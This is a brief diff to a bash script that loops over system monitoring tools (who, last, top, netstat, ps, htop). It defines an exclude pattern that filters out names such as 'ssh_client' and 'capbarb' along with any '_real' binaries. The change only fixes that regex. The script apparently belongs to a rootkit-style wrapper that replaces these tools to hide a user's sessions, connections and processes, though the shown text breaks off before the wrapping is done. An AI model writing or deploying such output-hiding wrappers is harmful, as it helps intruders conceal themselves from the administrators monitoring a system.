@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 bins=("who" "last" "top" "netstat" "ps" "htop")
-exclude="mail|uucp|ssh_client|capbarb|grep|*_real"
+exclude="mail|uucp|ssh_client|capbarb|grep|.*_real"
 
 for cmd in "${bins[@]}"; do
     orig_path=$(which $cmd)
